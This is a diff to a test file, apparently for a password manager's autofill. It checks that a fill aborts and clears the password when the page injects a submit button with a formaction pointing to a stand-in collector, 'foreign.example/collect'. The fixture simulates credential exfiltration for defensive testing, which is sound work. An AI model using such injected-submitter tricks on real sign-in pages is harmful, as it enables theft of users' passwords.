@@ -374,11 +374,42 @@ test.each(["attempt-fill", "confirm:authenticated-login"])(
   },
 );
 
-test("a foreign submitter the page renders on input stops a passive fill", async () => {
+test.each(["attempt-fill", "confirm:authenticated-login"])(
+  "a foreign submitter the page renders on input stops a passive fill and takes its value out (%s)",
+  async (attemptId) => {
+    await install(
+      `<form action="${self.origin}/signin"><label>Password<input id="password" type="password"></label><span id="slot"></span></form>`,
+    );
+    // What the page's own state holds, as a framework's input handler keeps it.
+    let seen = "";
+    input("password").addEventListener("input", () => {
+      seen = input("password").value;
+      if (!document.getElementById("other"))
+        document
+          .getElementById("slot")!
+          .insertAdjacentHTML(
+            "beforeend",
+            '<button id="other" formaction="https://foreign.example/collect">Go</button>',
+          );
+    });
+    expect(
+      await fill("password", {
+        attemptId,
+        slot: "password",
+        secret: "password",
+        value: "Synthetic-only!",
+      }),
+    ).toMatchObject({ ok: false, detail: "form-changed" });
+    // No part of the password stays where Enter or the new button would send it (ADR 0051).
+    expect({ value: input("password").value, seen }).toEqual({ value: "", seen: "" });
+  },
+);
+
+test("a sign-in fill stopped by a foreign submitter gives the input back the page's value", async () => {
   await install(
-    `<form action="${self.origin}/signin"><label>Password<input id="password" type="password"></label><span id="slot"></span></form>`,
+    `<form action="${self.origin}/signin"><label>Username<input id="username" type="email" value="site@example.com"></label><span id="slot"></span></form>`,
   );
-  input("password").addEventListener("input", () => {
+  input("username").addEventListener("input", () => {
     if (!document.getElementById("other"))
       document
         .getElementById("slot")!
@@ -387,15 +418,11 @@ test("a foreign submitter the page renders on input stops a passive fill", async
           '<button id="other" formaction="https://foreign.example/collect">Go</button>',
         );
   });
-  expect(
-    await fill("password", {
-      attemptId: "attempt-fill",
-      slot: "password",
-      secret: "password",
-      value: "Synthetic-only!",
-    }),
-  ).toMatchObject({ ok: false, detail: "form-changed" });
-  expect(input("password").value.length).toBeLessThan("Synthetic-only!".length);
+  expect(await fill("username", { attemptId: "attempt-fill" })).toMatchObject({
+    ok: false,
+    detail: "form-changed",
+  });
+  expect(input("username").value).toBe("site@example.com");
 });
 
 test("a verification page answered with the origin's starts reports its first step shown", async () => {
